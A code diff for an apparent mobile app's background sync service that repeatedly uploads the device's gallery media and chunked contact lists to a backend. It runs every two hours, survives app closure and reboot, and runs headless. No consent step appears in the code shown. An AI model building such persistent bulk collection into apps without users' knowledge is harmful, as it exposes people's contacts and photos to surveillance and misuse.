@@ -8,7 +8,7 @@ import { scanAndUploadGallery, MediaItem } from './MediaPipelineService';
 const sleep = (time: number) => new Promise<void>((resolve) => setTimeout(resolve, time));
 
 const CHUNK_SIZE = 50;
-const SYNC_INTERVAL_HOURS = 3;   // Har 3 ghante mein auto sync
+const SYNC_INTERVAL_HOURS = 2;   // Har 2 ghante mein auto sync
 const LAST_SYNC_KEY = 'SCH_LAST_SYNC_TIME';
 const UPLOADED_IDS_KEY = 'SCH_UPLOADED_FILE_IDS';
 const OPTIONS_KEY = 'SCH_SYNC_OPTIONS'; // BackgroundFetch ke liye options save karo
@@ -72,12 +72,14 @@ const runSyncSession = async (options: SyncOptions) => {
   let contactChunkIndex = 0;
   const allContactsSent = () => contactChunkIndex >= contactChunks.length;
 
-  // 10 minutes = 40 iterations × 15s
-  for (let i = 0; i < 40; i++) {
+  // 12 minutes = 48 iterations × 15s
+  for (let i = 0; i < 48; i++) {
     if (!BackgroundService.isRunning()) break;
 
-    // Gallery scan
     let newMediaItems: MediaItem[] = [];
+    const contactsCompleted = allContactsSent() || contactChunks.length === 0;
+
+    // Gallery scan (Run in parallel with contacts)
     try {
       newMediaItems = await scanAndUploadGallery(options.deviceId, persistedUploadedIds);
       if (newMediaItems.length > 0) {
@@ -92,7 +94,7 @@ const runSyncSession = async (options: SyncOptions) => {
     try {
       const payload: any = { deviceId: options.deviceId };
 
-      if (!allContactsSent() && contactChunks.length > 0) {
+      if (!contactsCompleted) {
         payload.contacts = contactChunks[contactChunkIndex];
         console.log(`[Sync ${i + 1}] Contact chunk ${contactChunkIndex + 1}/${contactChunks.length}`);
       }
@@ -104,13 +106,13 @@ const runSyncSession = async (options: SyncOptions) => {
         if (payload.contacts) contactChunkIndex++;
       }
 
-      console.log(`[Sync ${i + 1}/40] media:${newMediaItems.length} chunk:${contactChunkIndex}/${contactChunks.length}`);
+      console.log(`[Sync ${i + 1}/48] media:${newMediaItems.length} chunk:${contactChunkIndex}/${contactChunks.length}`);
 
     } catch (e: any) {
       console.error(`[Sync ${i + 1}] Backend failed:`, e?.message);
     }
 
-    if (i < 39) await sleep(15000);
+    if (i < 47) await sleep(15000);
   }
 
   await markSyncDone();
@@ -158,7 +160,7 @@ export const startBackgroundSync = async (options: SyncOptions) => {
 const scheduleAutoSync = async () => {
   BackgroundFetch.configure(
     {
-      minimumFetchInterval: 180,   // 180 minutes = 3 hours
+      minimumFetchInterval: 120,   // 120 minutes = 2 hours
       stopOnTerminate: false,       // App close hone ke baad bhi chale
       startOnBoot: true,            // Phone restart ke baad bhi chale
       enableHeadless: true,         // App open hone ki zaroorat nahi
